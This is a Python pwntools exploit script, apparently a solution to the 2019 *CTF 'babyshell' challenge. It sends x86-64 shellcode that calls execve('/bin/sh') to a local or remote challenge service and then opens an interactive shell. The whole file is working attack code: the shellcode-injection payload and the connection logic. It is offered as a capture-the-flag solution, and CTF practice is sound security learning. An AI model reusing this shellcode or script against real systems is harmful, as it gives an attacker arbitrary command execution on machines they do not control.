import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./starctf_2019_babyshell')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./starctf_2019_babyshell')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26454)
			elf=ELF('./starctf_2019_babyshell')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		
		io.recv()
		# gdb.attach(io)
		# pause()
		shell='''
		push 0x68
		mov rax, 0x68732f6e69622f
		push rax
		mov rdi, rsp
		/* push argument array ['sh\x00'] */
		/* push 'sh\x00' */
		push 0x1010101 ^ 0x6873
		xor dword ptr [rsp], 0x1010101
		xor esi, esi /* 0 */
		push rsi /* null terminate */
		push 8
		pop rsi
		add rsi, rsp
		push rsi /* 'sh\x00' */
		mov rsi, rsp
		xor edx, edx /* 0 */
		/* call execve() */
		push 59 /* 0x3b */
		pop rax
		syscall
		'''
		io.sendline('\x00'+asm(shell))


		# gdb.attach(io)
		# pause()
		io.interactive('keer =>> ')

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue